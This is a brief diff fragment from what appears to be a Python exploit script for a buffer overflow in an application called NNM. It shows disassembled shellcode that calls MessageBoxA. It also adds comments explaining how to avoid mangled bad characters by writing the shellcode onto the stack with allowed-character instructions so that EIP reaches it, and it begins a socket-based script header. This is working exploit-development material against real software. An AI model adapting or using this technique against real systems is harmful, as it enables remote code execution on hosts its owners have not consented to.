@@ -25,6 +25,13 @@
 #1035FFDD   BE DED83B77      MOV ESI,USER32.MessageBoxA //put MessageBoxA address in esi
 #1035FFE2   FFE6             JMP ESI			//jump to message box
 
+#This shellcode cannot be placed in the exploit buffer because some of the characters get mangled by the NNM application.  
+#The solution is to include instructions in the buffer that will write the shellcode to the stack, 
+#at a numerically higher position than the exploit buffer, so that EIP will run into the shellcode after 
+#it writes the instructions.  The instructions to write the shellcode need to be within a list of allowed 
+#characters that the application will not mangle.
+
+
 #!/usr/bin/python
 import socket
 import os
